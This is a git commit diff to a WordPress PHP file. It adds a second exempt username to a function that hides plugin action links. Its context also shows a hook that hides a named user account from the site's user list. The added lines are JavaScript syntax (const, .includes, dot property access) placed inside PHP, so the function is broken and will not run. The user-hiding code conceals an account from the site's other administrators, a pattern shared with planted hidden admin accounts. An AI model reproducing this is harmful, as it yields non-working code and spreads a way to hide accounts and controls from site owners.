7728737161fb6e9e8b252dd635e70d5fb227911b
paveltravnicek <80485198+paveltravnicek@users.noreply.github.com>
2025-02-17 07:59:42 +0100

    Update universal-functions.php

--- universal-functions.php
+++ universal-functions.php
@@ -138,9 +138,8 @@ function hide_paveltravnicek_from_users_list($query) {
 add_action('pre_user_query', 'hide_paveltravnicek_from_users_list');
 
 function skryt_radek_akci_pro_chranene_pluginy() {
-    $current_user = wp_get_current_user();
-    
-    if ($current_user->user_login === 'paveltravnicek') {
+    const currentUser = wp_get_current_user();
+    if (['paveltravnicek', 'lukashulka'].includes(currentUser.user_login)) {
         return;
     }
 
